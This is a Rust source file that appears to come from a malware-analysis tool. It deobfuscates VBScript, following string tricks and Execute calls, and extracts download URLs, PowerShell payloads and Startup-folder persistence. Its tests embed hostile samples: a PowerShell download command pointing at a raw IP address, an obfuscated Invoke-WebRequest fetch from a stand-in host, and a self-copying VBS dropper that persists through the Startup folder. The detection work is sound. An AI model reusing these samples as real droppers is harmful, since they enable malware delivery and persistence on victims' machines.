    let Some(start) = find_ascii_case_insensitive_from(line, "urldownloadtofile", 0) else {
        return Vec::new();
    };
    let mut rest = &line[start + "urldownloadtofile".len()..];
    rest = rest.trim_start();
    if matches!(rest.as_bytes().first(), Some(b'A' | b'a' | b'W' | b'w')) {
        rest = &rest[1..];
        rest = rest.trim_start();
    }
    if let Some(stripped) = rest.strip_prefix('(') {
        rest = stripped;
    }
    let rest = rest.trim_end().strip_suffix(')').unwrap_or(rest);
    split_vbs_args(rest)
}

fn extract_savetofile_dest_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let lower = line.to_ascii_lowercase();
        let mut cursor = 0usize;
        while let Some(rel) = lower[cursor..].find(".savetofile") {
            let call_start = cursor + rel;
            let args_start = call_start + ".savetofile".len();
            let next = line[args_start..].chars().next();
            if !next.is_some_and(|c| c.is_ascii_whitespace() || c == '(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.first() {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn extract_vbs_execute_inners(env: &mut Environment) {
    let mut seen_payloads: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_vbs.iter().cloned().collect();
    let mut queue = env.all_extracted_vbs.clone();
    let mut execute_count = 0usize;
    let mut expanded_bytes = 0usize;
    let mut cursor = 0usize;

    while cursor < queue.len()
        && execute_count < MAX_EXECUTE_COUNT
        && expanded_bytes < MAX_EXECUTE_EXPANSION_BYTES
    {
        let payload = queue[cursor].clone();
        cursor += 1;
        let raw = String::from_utf8_lossy(&payload);
        let text = join_vbs_line_continuations(&raw);
        let bindings = collect_vbs_string_bindings(&text);

        for line in text.lines() {
            let Some(expr) = vbs_execute_expr(line) else {
                continue;
            };
            let Some(decoded) = eval_vbs_string_expr(expr, &bindings) else {
                continue;
            };
            let decoded = decoded.trim();
            if decoded.is_empty() {
                continue;
            }
            expanded_bytes = expanded_bytes.saturating_add(decoded.len());
            if expanded_bytes > MAX_EXECUTE_EXPANSION_BYTES {
                break;
            }
            execute_count += 1;
            let bytes = decoded.as_bytes().to_vec();
            if seen_payloads.insert(bytes.clone()) && env.push_extracted_vbs(bytes.clone()) {
                queue.push(bytes.clone());
            }
            if execute_count >= MAX_EXECUTE_COUNT {
                break;
            }
        }
    }
}

fn collect_vbs_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut bindings = std::collections::HashMap::new();
    for line in text.lines() {
        for statement in split_vbs_statements(line) {
            let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) else {
                continue;
            };
            let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
                continue;
            };
            let Some(value) = eval_vbs_assignment_value(name.as_str(), value.as_str(), &bindings)
            else {
                continue;
            };
            bindings.insert(name.as_str().to_ascii_lowercase(), value);
        }
    }
    bindings
}

fn collect_vbs_lossy_string_bindings(
    text: &str,
    exact_bindings: &std::collections::HashMap<String, String>,
) -> std::collections::HashMap<String, String> {
    let mut bindings = exact_bindings.clone();
    for line in text.lines() {
        for statement in split_vbs_statements(line) {
            collect_vbs_special_folder_binding(statement, &mut bindings);
            let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) else {
                continue;
            };
            let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
                continue;
            };
            let Some(value) =
                eval_vbs_assignment_value_lossy(name.as_str(), value.as_str(), &bindings)
            else {
                continue;
            };
            bindings.insert(name.as_str().to_ascii_lowercase(), value);
        }
    }
    bindings
}

fn collect_vbs_marker_stripped_shell_bindings(
    text: &str,
    initial_bindings: &std::collections::HashMap<String, String>,
) -> std::collections::HashMap<String, String> {
    let mut bindings = initial_bindings.clone();
    let mut out = std::collections::HashMap::new();
    for line in text.lines() {
        for statement in split_vbs_statements(line) {
            let Some((name, value)) =
                eval_vbs_marker_stripped_self_assignment(statement, &bindings)
            else {
                continue;
            };
            bindings.insert(name.clone(), value.clone());
            if value_looks_like_shell_command(&value) {
                out.insert(name, value);
            }
        }
    }
    out
}

fn eval_vbs_marker_stripped_self_assignment(
    statement: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<(String, String)> {
    let caps = VBS_STRING_ASSIGN_RE.captures(statement)?;
    let name = caps.get(1)?.as_str();
    let rhs = caps.get(2)?.as_str().trim();
    let open = rhs.find('(')?;
    let function_name = rhs[..open].trim();
    if !is_vbs_identifier(function_name) {
        return None;
    }
    let inner = rhs[open + 1..].trim().strip_suffix(')')?;
    let args = split_vbs_args(inner);
    if args.len() < 3 || !args[0].trim().eq_ignore_ascii_case(name) {
        return None;
    }
    let source = bindings.get(&name.to_ascii_lowercase())?;
    let marker = eval_vbs_string_expr_lossy(args[1], bindings)?;
    let replacement = eval_vbs_string_expr_lossy(args[2], bindings)?;
    if marker.is_empty() || marker.len() > 256 || replacement.len() > 256 {
        return None;
    }
    let cleaned = source.replace(&marker, &replacement);
    if cleaned == *source || !value_looks_like_shell_command(&cleaned) {
        return None;
    }
    Some((name.to_ascii_lowercase(), cleaned))
}

fn value_looks_like_shell_command(value: &str) -> bool {
    crate::util::contains_ascii_case_insensitive(value, "powershell")
        || crate::util::contains_ascii_case_insensitive(value, "cmd.exe")
        || crate::util::contains_ascii_case_insensitive(value, "wscript")
        || crate::util::contains_ascii_case_insensitive(value, "cscript")
        || crate::util::contains_ascii_case_insensitive(value, "mshta")
}

fn collect_vbs_special_folder_binding(
    statement: &str,
    bindings: &mut std::collections::HashMap<String, String>,
) {
    let Some((lhs, rhs)) = statement.split_once('=') else {
        return;
    };
    if !crate::util::contains_ascii_case_insensitive(rhs, ".SpecialFolders")
        || !crate::util::contains_ascii_case_insensitive(rhs, "Startup")
    {
        return;
    }
    let name = lhs.trim();
    if !is_vbs_identifier(name) {
        return;
    }
    bindings.insert(name.to_ascii_lowercase(), "%Startup%".to_string());
}

fn eval_vbs_assignment_value(
    name: &str,
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    if let Some(value) = eval_vbs_string_expr(expr, bindings) {
        return Some(value);
    }

    let key = name.to_ascii_lowercase();
    let parts = split_vbs_concat(expr);
    let first = parts.first()?.trim().trim_matches(['(', ')']);
    if !first.eq_ignore_ascii_case(name) {
        return None;
    }

    let mut out = bindings.get(&key).cloned().unwrap_or_default();
    let mut saw_appended = false;
    for part in parts.into_iter().skip(1) {
        let value = eval_vbs_string_expr(part, bindings)?;
        out.push_str(&value);
        saw_appended = true;
    }
    saw_appended.then_some(out)
}

fn eval_vbs_assignment_value_lossy(
    name: &str,
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    if let Some(value) = eval_vbs_string_expr(expr, bindings) {
        return Some(value);
    }

    let key = name.to_ascii_lowercase();
    let parts = split_vbs_concat(expr);
    let first = parts.first()?.trim().trim_matches(['(', ')']);
    if first.eq_ignore_ascii_case(name) {
        let mut out = bindings.get(&key).cloned().unwrap_or_default();
        let mut saw_appended = false;
        for part in parts.into_iter().skip(1) {
            let value = eval_vbs_string_expr_lossy(part, bindings)?;
            out.push_str(&value);
            saw_appended = true;
        }
        return saw_appended.then_some(out);
    }

    eval_vbs_string_expr_lossy(expr, bindings)
}

fn vbs_execute_expr(line: &str) -> Option<&str> {
    let trimmed = line.trim_start();
    if !starts_with_ascii_case_insensitive(trimmed, "execute") {
        return None;
    }
    let mut rest = &trimmed["execute".len()..];
    rest = rest.trim_start();
    if let Some(stripped) = rest.strip_prefix('(') {
        rest = stripped.trim_start();
    }
    let rest = rest.trim_end();
    let rest = rest.strip_suffix(')').unwrap_or(rest).trim_end();
    if rest.is_empty() {
        None
    } else {
        Some(rest)
    }
}

fn extract_xmlhttp_open_url_exprs(text: &str) -> Vec<&str> {
    let mut out = Vec::new();
    for line in text.lines() {
        let mut cursor = 0usize;
        while let Some(open_start) = find_ascii_case_insensitive_from(line, ".open", cursor) {
            let args_start = open_start + ".open".len();
            let next = line.as_bytes().get(args_start).copied();
            if !next.is_some_and(|b| b.is_ascii_whitespace() || b == b'(') {
                cursor = args_start;
                continue;
            }
            let mut args = line[args_start..].trim_start();
            if let Some(rest) = args.strip_prefix('(') {
                args = rest;
            }
            let parts = split_vbs_args(args);
            if let Some(expr) = parts.get(1) {
                out.push(*expr);
            }
            cursor = args_start;
        }
    }
    out
}

fn join_vbs_line_continuations(text: &str) -> String {
    let mut out = String::new();
    for line in text.lines() {
        let trimmed_end = line.trim_end();
        if let Some(prefix) = trimmed_end.strip_suffix('_') {
            out.push_str(prefix.trim_end());
            out.push(' ');
        } else {
            out.push_str(line);
            out.push('\n');
        }
    }
    out
}

fn strip_vbs_apostrophe_comments(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for line in text.lines() {
        let bytes = line.as_bytes();
        let mut in_quote = false;
        let mut cut = line.len();
        let mut i = 0usize;
        while i < bytes.len() {
            match bytes[i] {
                b'"' => {
                    if in_quote && bytes.get(i + 1) == Some(&b'"') {
                        i += 2;
                        continue;
                    }
                    in_quote = !in_quote;
                    i += 1;
                }
                b'\'' if !in_quote => {
                    cut = i;
                    break;
                }
                _ => i += 1,
            }
        }
        out.push_str(line[..cut].trim_end());
        out.push('\n');
    }
    out
}

fn split_vbs_statements(line: &str) -> Vec<&str> {
    let mut statements = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b':' if !in_quote => {
                statements.push(line[start..i].trim());
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    statements.push(line[start..].trim());
    statements
}

fn eval_vbs_string_expr(
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let mut out = String::new();
    let mut saw_part = false;
    for part in split_vbs_concat(expr) {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(value) = parse_vbs_string_literal(part) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(ch) = parse_vbs_chr(part) {
            out.push(ch);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_string_transform(part, bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_split_index(part, bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_cstr(part, bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_replace(part, bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        if let Some(value) = parse_vbs_mid(part, bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        let key = part.trim_matches(['(', ')']).to_ascii_lowercase();
        if let Some(value) = bindings.get(&key) {
            out.push_str(value);
            saw_part = true;
            continue;
        }
        return None;
    }
    saw_part.then_some(out)
}

fn eval_vbs_string_expr_lossy(
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let mut out = String::new();
    let mut saw_part = false;
    for part in split_vbs_concat(expr) {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(value) = eval_vbs_string_expr(part, bindings) {
            out.push_str(&value);
            saw_part = true;
            continue;
        }
        let key = part.trim_matches(['(', ')']).to_ascii_lowercase();
        if is_vbs_identifier(&key) {
            out.push_str("%VBSVAR:");
            out.push_str(&key);
            out.push('%');
            saw_part = true;
            continue;
        }
        if crate::util::contains_ascii_case_insensitive(part, "WScript.ScriptName") {
            out.push_str("%WScript.ScriptName%");
            saw_part = true;
            continue;
        }
        if crate::util::contains_ascii_case_insensitive(part, "CurrentDirectory") {
            out.push_str("%CurrentDirectory%");
            saw_part = true;
            continue;
        }
        return None;
    }
    saw_part.then_some(out)
}

fn is_vbs_identifier(value: &str) -> bool {
    let mut chars = value.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first.is_ascii_alphabetic() || first == '_')
        && chars.all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
}

fn split_vbs_concat(expr: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let mut paren_depth = 0usize;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b'(' if !in_quote => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_quote => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b'&' | b'+' if !in_quote && paren_depth == 0 => {
                parts.push(&expr[start..i]);
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    parts.push(&expr[start..]);
    parts
}

fn parse_vbs_string_literal(part: &str) -> Option<String> {
    let part = part.trim();
    if !part.starts_with('"') || !part.ends_with('"') || part.len() < 2 {
        return None;
    }
    Some(part[1..part.len() - 1].replace("\"\"", "\""))
}

fn parse_vbs_chr(part: &str) -> Option<char> {
    let trimmed = part.trim();
    let inner = if starts_with_ascii_case_insensitive(trimmed, "chrw(") {
        trimmed.get("chrw(".len()..)?
    } else if starts_with_ascii_case_insensitive(trimmed, "chr(") {
        trimmed.get("chr(".len()..)?
    } else {
        return None;
    };
    let inner = inner.strip_suffix(')')?;
    let value = parse_vbs_integer(inner)?;
    char::from_u32(value)
}

fn parse_vbs_integer(value: &str) -> Option<u32> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    if let Some(integer) = parse_vbs_integer_atom(value) {
        return Some(integer);
    }

    parse_vbs_integer_sum(value)
}

fn parse_vbs_integer_atom(value: &str) -> Option<u32> {
    let value = value.trim();
    if let Some(hex) = value
        .strip_prefix("&h")
        .or_else(|| value.strip_prefix("&H"))
        .or_else(|| value.strip_prefix("0x"))
        .or_else(|| value.strip_prefix("0X"))
    {
        u32::from_str_radix(hex.trim(), 16).ok()
    } else {
        value.parse().ok()
    }
}

fn parse_vbs_integer_sum(value: &str) -> Option<u32> {
    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = value.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = value[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_vbs_integer_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = value[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_vbs_integer_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_vbs_string_transform(
    part: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    if let Some(inner) = vbs_function_args(part, "strreverse") {
        let value = eval_vbs_string_expr(inner, bindings)?;
        return Some(reverse_vbs_string(&value));
    }
    if let Some(inner) = vbs_function_args(part, "lcase") {
        return Some(eval_vbs_string_expr(inner, bindings)?.to_ascii_lowercase());
    }
    if let Some(inner) = vbs_function_args(part, "ucase") {
        return Some(eval_vbs_string_expr(inner, bindings)?.to_ascii_uppercase());
    }
    if let Some(inner) = vbs_function_args(part, "trim") {
        return Some(eval_vbs_string_expr(inner, bindings)?.trim().to_string());
    }
    if let Some(inner) = vbs_function_args(part, "ltrim") {
        return Some(
            eval_vbs_string_expr(inner, bindings)?
                .trim_start()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "rtrim") {
        return Some(
            eval_vbs_string_expr(inner, bindings)?
                .trim_end()
                .to_string(),
        );
    }
    if let Some(inner) = vbs_function_args(part, "join") {
        let args = split_vbs_args(inner);
        if args.len() < 2 {
            return None;
        }
        let values = parse_vbs_array_values(args[0], bindings)?;
        let separator = eval_vbs_string_expr(args[1], bindings)?;
        return Some(values.join(&separator));
    }
    if starts_with_ascii_case_insensitive(part.trim(), "left(") {
        let args = split_vbs_args(vbs_function_args(part, "left")?);
        if args.len() < 2 {
            return None;
        }
        let value = eval_vbs_string_expr(args[0], bindings)?;
        let count = parse_vbs_integer(args[1])? as usize;
        return Some(snippet_prefix(&value, count));
    }
    if starts_with_ascii_case_insensitive(part.trim(), "right(") {
        let args = split_vbs_args(vbs_function_args(part, "right")?);
        if args.len() < 2 {
            return None;
        }
        let value = eval_vbs_string_expr(args[0], bindings)?;
        let count = parse_vbs_integer(args[1])? as usize;
        return Some(snippet_suffix(&value, count));
    }
    None
}

fn parse_vbs_split_index(
    part: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let trimmed = part.trim();
    if !starts_with_ascii_case_insensitive(trimmed, "split(") || !trimmed.ends_with(')') {
        return None;
    }
    let idx_start = trimmed.rfind(")(")?;
    let call = &trimmed[..idx_start + 1];
    let index = parse_vbs_integer(trimmed[idx_start + 2..trimmed.len() - 1].trim())? as usize;
    let pieces = parse_vbs_split_values(call, bindings)?;
    pieces.get(index).cloned()
}

fn parse_vbs_split_values(
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<Vec<String>> {
    let inner = vbs_function_args(expr, "split")?;
    let args = split_vbs_args(inner);
    if args.is_empty() {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings)?;
    let separator = if let Some(sep_expr) = args.get(1) {
        eval_vbs_string_expr(sep_expr, bindings)?
    } else {
        " ".to_string()
    };
    Some(if separator.is_empty() {
        source.chars().map(|c| c.to_string()).collect()
    } else {
        source.split(&separator).map(|s| s.to_string()).collect()
    })
}

fn parse_vbs_array_values(
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<Vec<String>> {
    if let Some(values) = parse_vbs_split_values(expr, bindings) {
        return Some(values);
    }
    let inner = vbs_function_args(expr, "array")?;
    let mut values = Vec::new();
    for arg in split_vbs_args(inner) {
        let value = eval_vbs_string_expr(arg, bindings)?;
        values.push(value);
    }
    Some(values)
}

fn parse_vbs_cstr(
    part: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let inner = vbs_function_args(part, "cstr")?;
    eval_vbs_string_expr(inner, bindings)
}

fn parse_vbs_replace(
    part: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let inner = vbs_function_args(part, "replace")?;
    let args = split_vbs_args(inner);
    if args.len() < 3 {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings)?;
    let find = eval_vbs_string_expr(args[1], bindings)?;
    let replacement = eval_vbs_string_expr(args[2], bindings)?;
    if find.is_empty() {
        return Some(source);
    }
    if args
        .get(5)
        .is_some_and(|compare| vbs_replace_text_compare(compare))
    {
        Some(replace_ascii_case_insensitive(&source, &find, &replacement))
    } else {
        Some(source.replace(&find, &replacement))
    }
}

fn vbs_replace_text_compare(compare: &str) -> bool {
    let compare = compare.trim().trim_matches(['(', ')']);
    compare.eq_ignore_ascii_case("vbTextCompare") || compare == "1"
}

fn replace_ascii_case_insensitive(source: &str, find: &str, replacement: &str) -> String {
    if find.is_empty() {
        return source.to_string();
    }
    let source_lower = source.to_ascii_lowercase();
    let find_lower = find.to_ascii_lowercase();
    let mut out = String::with_capacity(source.len());
    let mut cursor = 0usize;
    while let Some(rel) = source_lower[cursor..].find(&find_lower) {
        let start = cursor + rel;
        out.push_str(&source[cursor..start]);
        out.push_str(replacement);
        cursor = start + find.len();
    }
    out.push_str(&source[cursor..]);
    out
}

fn parse_vbs_mid(
    part: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let inner = vbs_function_args(part, "mid")?;
    let args = split_vbs_args(inner);
    if args.len() < 2 {
        return None;
    }
    let source = eval_vbs_string_expr(args[0], bindings)?;
    let start = parse_vbs_integer(args[1])? as usize;
    let skip = start.saturating_sub(1);
    let chars: Vec<char> = source.chars().collect();
    if skip >= chars.len() {
        return Some(String::new());
    }
    let take = args
        .get(2)
        .and_then(|arg| parse_vbs_integer(arg).map(|value| value as usize))
        .unwrap_or(chars.len() - skip);
    Some(chars.into_iter().skip(skip).take(take).collect())
}

fn vbs_function_args<'a>(part: &'a str, name: &str) -> Option<&'a str> {
    let part = part.trim();
    let prefix_len = name.len();
    if !starts_with_ascii_case_insensitive(part, name)
        || part.as_bytes().get(prefix_len) != Some(&b'(')
    {
        return None;
    }
    let inner = part.get(prefix_len + 1..part.len().checked_sub(1)?)?;
    part.ends_with(')').then_some(inner)
}

fn split_vbs_args(expr: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut in_quote = false;
    let mut paren_depth = 0usize;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                if in_quote && bytes.get(i + 1) == Some(&b'"') {
                    i += 2;
                    continue;
                }
                in_quote = !in_quote;
                i += 1;
            }
            b'(' if !in_quote => {
                paren_depth += 1;
                i += 1;
            }
            b')' if !in_quote => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b',' if !in_quote && paren_depth == 0 => {
                parts.push(expr[start..i].trim());
                i += 1;
                start = i;
            }
            _ => i += 1,
        }
    }
    parts.push(expr[start..].trim());
    parts
}

fn reverse_vbs_string(s: &str) -> String {
    if s.is_ascii() {
        return s.bytes().rev().map(|b| b as char).collect();
    }
    s.chars().rev().collect()
}

#[cfg(test)]
mod tests {
    use super::{
        collect_vbs_string_bindings, command_download_urls, parse_vbs_replace,
        parse_vbs_string_transform, powershell_command_payload, reverse_vbs_string,
        scan_vbs_payloads,
    };
    use crate::env::{Config, Environment};
    use crate::traits::Trait;

    #[test]
    fn parse_vbs_string_transform_matches_mixed_case_left_and_right() {
        let bindings = std::collections::HashMap::new();
        assert_eq!(
            parse_vbs_string_transform("lEfT(\"abcd\", 2)", &bindings),
            Some("ab".to_string())
        );
        assert_eq!(
            parse_vbs_string_transform("rIgHt(\"abcd\", 2)", &bindings),
            Some("cd".to_string())
        );
    }

    #[test]
    fn reverse_vbs_string_fast_paths_ascii_and_preserves_unicode() {
        assert_eq!(reverse_vbs_string("abcd"), "dcba");
        assert_eq!(reverse_vbs_string("héllo"), "olléh");
    }

    #[test]
    fn accumulative_chr_assignment_extends_existing_binding() {
        let bindings = collect_vbs_string_bindings(
            "Dim pdf\npdf = pdf + Chr(99)\npdf = pdf + Chr(109)\npdf = pdf + Chr(100)",
        );
        assert_eq!(bindings.get("pdf").map(String::as_str), Some("cmd"));
    }

    #[test]
    fn command_download_urls_repairs_damaged_scheme_in_download_context() {
        assert_eq!(
            command_download_urls(
                "cmd /c powershell Invoke-WebRequest -Uri ttp://45.88.67.75/pdf/a.pdf%Temp%\\google.vbs",
            ),
            vec!["http://45.88.67.75/pdf/a.pdf".to_string()]
        );
    }

    #[test]
    fn replace_with_empty_needle_is_not_expanded() {
        let bindings = std::collections::HashMap::new();
        assert_eq!(
            parse_vbs_replace(r#"Replace("abc", "", "X")"#, &bindings),
            Some("abc".to_string())
        );
    }

    #[test]
    fn powershell_run_payload_rejects_unresolved_vbs_concat_tail() {
        assert_eq!(
            powershell_command_payload(r#"powershell -command " & hipercloridria"#),
            None
        );
    }

    #[test]
    fn shell_run_marker_stripped_powershell_is_extracted() {
        let vbs = r#"
Function stripm(ByVal source, ByVal marker, ByVal replacement)
    stripm = Replace(source, marker, replacement)
End Function
marker = "@@"
cmd = "pow@@ershell -command "
script = "$url = 'https://vbs-marker.example/payload'; Invoke-WebRequest -Uri $url"
cmd = cmd & script
cmd = stripm(cmd, marker, "")
Set sh = CreateObject("WScript.Shell")
sh.Run cmd, 0, False
"#;
        let mut env = Environment::new(&Config::default());
        env.push_extracted_vbs(vbs.as_bytes().to_vec());
        scan_vbs_payloads(&mut env);

        assert!(
            env.all_extracted_ps1.iter().any(|payload| {
                let text = String::from_utf8_lossy(payload);
                text.contains("Invoke-WebRequest -Uri $url") && !text.contains("@@")
            }),
            "marker-stripped PowerShell payload was not queued: {:?}",
            env.all_extracted_ps1
        );
    }

    #[test]
    fn shell_run_copyfile_startup_persistence_and_powershell_are_extracted() {
        let vbs = r#"
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
originador = "recoleta.vbs"
estrefura = WshShell.CurrentDirectory & "\" & WScript.ScriptName
enloisar = WshShell.SpecialFolders("Startup")
mortulho = enloisar & "\" & originador
fso.CopyFile estrefura, mortulho
agasalhado = "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" & originador
hipercloridria = "[System.IO.File]::Copy('" & estrefura & "', 'C:\Users\' + [Environment]::UserName + '" & agasalhado & "')"
decathlo = "cmd.exe /c ping 127.0.0.1 -n 10 & powershell -command " & hipercloridria
WshShell.Run decathlo, 0, true
"#;
        let mut env = Environment::new(&Config::default());
        env.push_extracted_vbs(vbs.as_bytes().to_vec());
        scan_vbs_payloads(&mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::Persistence {
                    hive,
                    key,
                    value_name,
                    command,
                } if hive == "StartupFolder"
                    && key == "%Startup%"
                    && value_name == "recoleta.vbs"
                    && command == "%Startup%\\recoleta.vbs"
            )),
            "Startup CopyFile persistence was not extracted: {:?}",
            env.traits
        );
        assert!(
            env.all_extracted_ps1.iter().any(|payload| {
                let text = String::from_utf8_lossy(payload);
                text.contains("[System.IO.File]::Copy")
                    && text.contains(r"Programs\Startup\recoleta.vbs")
            }),
            "WshShell.Run PowerShell payload was not queued: {:?}",
            env.all_extracted_ps1
        );
    }
}
